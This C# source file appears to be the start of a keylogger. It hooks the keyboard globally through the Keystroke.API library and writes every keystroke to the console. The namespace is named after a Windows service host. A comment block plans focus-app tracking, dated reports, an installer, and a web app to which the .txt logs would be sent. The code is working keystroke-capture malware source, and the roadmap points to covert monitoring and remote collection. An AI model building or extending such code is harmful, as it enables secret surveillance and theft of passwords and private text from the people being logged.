using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Keystroke.API;

/* Features to add
 * 1. Being able to tell which app is in focus
 * 2. Separating Reports by Date
 * 3. Creating the web app (login page, registration page, PC page, organize reports by date, database)
 * 4. Creating an installer
 * 5. Sending the .txt files to the correct user account and PC
 */

namespace Windows_Service_Host
{
    class Program
    {
        static void Main(string[] args)
        {
            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook((character) => { Console.Write(character); });
                Application.Run();
            }
        }
    }
}
